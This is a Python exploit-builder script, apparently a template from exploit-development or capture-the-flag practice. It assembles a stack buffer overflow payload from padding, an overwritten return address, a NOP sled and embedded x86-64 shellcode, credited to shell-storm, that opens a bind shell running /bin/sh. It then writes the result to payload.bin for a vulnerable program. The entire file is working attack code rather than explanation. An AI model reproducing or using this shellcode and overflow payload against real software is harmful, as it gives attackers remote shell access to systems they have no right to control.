import struct

offset = 16		# enter offset
rip = 0xdeadbeef	# replace dummy address with position of saved rip

# Shellcode for spawning a bind shell https://shell-storm.org/shellcode/files/shellcode-78.html
payload =  (
	b"\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"
        b"\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"
        b"\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"
        b"\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"
        b"\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"
        b"\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"
        b"\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
        b"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"
        b"\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
)

sled_size = 16	# should probably be multiple of 16


# Fill the padding to the right offset (e.g., 16 bytes)
pad = b"\x41" * offset

# Calculate the correct RIP address based on your environment and memory layout
RIP = struct.pack("<Q", rip + 8)

# NOP sled (padding to ensure we land on the shellcode) 16 byte aligned.
NOP = b"\x90" * sled_size

# Final payload: padding + RIP + NOP sled + shellcode
exploit = pad + RIP + NOP + payload

# Save to a binary file for input to the vulnerable program
with open("payload.bin", "wb") as f:
    f.write(exploit)

print("Payload saved to payload.bin")
